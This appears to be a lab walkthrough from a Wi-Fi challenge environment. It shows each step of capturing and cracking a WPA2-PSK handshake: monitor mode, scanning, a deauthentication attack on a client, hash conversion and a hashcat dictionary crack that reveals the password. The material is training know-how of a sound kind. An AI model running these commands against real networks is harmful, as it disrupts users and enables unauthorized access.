Put wireless card into monitor mode:

```bash
root@WiFiChallengeLab:~/wpa# airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    541 avahi-daemon
    546 NetworkManager
    570 wpa_supplicant
    575 avahi-daemon
    818 ifplugd

PHY	Interface	Driver		Chipset

phy0	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0
```

Scan for target WPA2 network:

```bash
root@WiFiChallengeLab:~/wpa# airodump-ng wlan0mon --band abg
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:10  -28        2        0    0   6   54   OPN              wifi-guest                                                                                                                                                        
 EA:2A:C3:20:36:4B  -28        2        0    0   6   54   WPA2 CCMP   PSK  MiFibra-5-D6G3                                                                                                                                                    
 82:EE:66:FB:FA:B7  -28        2        0    0   6   54        CCMP   PSK  WIFI-JUAN                                                                                                                                                         
 F0:9F:C2:71:22:12  -28        2        0    0   6   54        CCMP   PSK  wifi-mobile                                                                                                                                                       
 F0:9F:C2:6A:88:26  -28        3        0    0  11   54   OPN              <length:  9>                                                                                                                                                      
 F0:9F:C2:1A:CA:25  -28        3        0    0  11   54e  WPA3 CCMP   SAE  wifi-IT                                                                                                                                                           
 F0:9F:C2:11:0A:24  -28        3        0    0  11   54e  WPA3 CCMP   SAE  wifi-management                                                                                                                                                   
 96:8E:24:05:65:FE  -28        3        0    0   9   54        TKIP   PSK  vodafone7123                                                                                                                                                      
 F0:9F:C2:71:22:15  -28        7        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp                                                                                                                                                         
 F0:9F:C2:7A:33:28  -28        7        0    0  44   54e  WPA2 CCMP   MGT  wifi-regional-tablets                                                                                                                                             
 CA:5C:D0:39:C8:BD  -28       74        0    0   3   54        CCMP   PSK  MOVISTAR_JYG2                                                                                                                                                     
 F0:9F:C2:71:22:17  -28        8       38   13  44   54e  WPA2 CCMP   MGT  wifi-global                                                                                                                                                       
 F0:9F:C2:71:22:16  -28        8        0    0  44   54e  WPA2 CCMP   MGT  wifi-regional                                                                                                                                                     
 F0:9F:C2:71:22:1A  -28        8        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp                                                                                                                                                         
 F0:9F:C2:71:22:11  -28       75     2226  282   3   54   WEP  WEP         wifi-old

```

Once target is found, scan only that device and save the output:

```bash
root@WiFiChallengeLab:~/wpa# airodump-ng wlan0mon --band abg -c 6 --bssid F0:9F:C2:71:22:12 -w wpa_handshake
 CH  6 ][ Elapsed: 18 s ][ 2024-09-03 13:33 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:12  -28   0      227       98    2   6   54        CCMP   PSK  wifi-mobile                                                                                                                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -29   54 -54      0        4                                                                                                                                                                           
 F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 - 9      0       90
```

In a separate window, we can kick a client off the network and let it re-authenticate. That way it would be possible to capture the WPA2-PSK 4 way handshake:

```bash
root@WiFiChallengeLab:~/wpa# aireplay-ng -0 1 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:43 wlan0mon
13:37:04  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:12) on channel 6
13:37:04  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
```

Now we have the WPA2 handshake:

```bash
CH  6 ][ Elapsed: 1 min ][ 2024-09-03 13:37 ][ WPA handshake: F0:9F:C2:71:22:12 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:12  -28   0      748      285    0   6   54        CCMP   PSK  wifi-mobile                                                                                                                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29    6 -36      0      402  EAPOL                                                                                                                                                                    
 F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -29   54 -54      0        9         wifi-mobile
```

To crack the handshake using hashcat, we need to convert the handshake into a file hashcat can read:

```bash
root@WiFiChallengeLab:~/wpa# hcxpcapngtool wpa_handshake-01.cap -o wpa_out
```

We can verify there is a hash by catting the output file:

```bash
root@WiFiChallengeLab:~/wpa# cat wpa_out 
WPA*02*2cb6de5d524865fdc6c949266d4733f7*f09fc2712212*286c076ff943*776966692d6d6f62696c65*53d666842cc9c6f2d863b49cda3ed95739ccad0959e510c9725ab77dd4d178b4*0103007502010a00000000000000000001b2e671e69eeaf685f762d12e2cd9e8ed0bb5d83226879b66cd404385a059d32d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*02
```

Then we just need to crack it:

```bash
garffff@garffff:~/wifi$ hashcat -m 22000 wpa_out /opt/rockyou.txt 
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 12.2.148) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10176/11164 MB (2791 MB allocatable), 28MCU

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=====================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, skipped

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

2cb6de5d524865fdc6c949266d4733f7:f09fc2712212:286c076ff943:wifi-mobile:starwars1
```


```bash
```


```bash
```

```bash
```
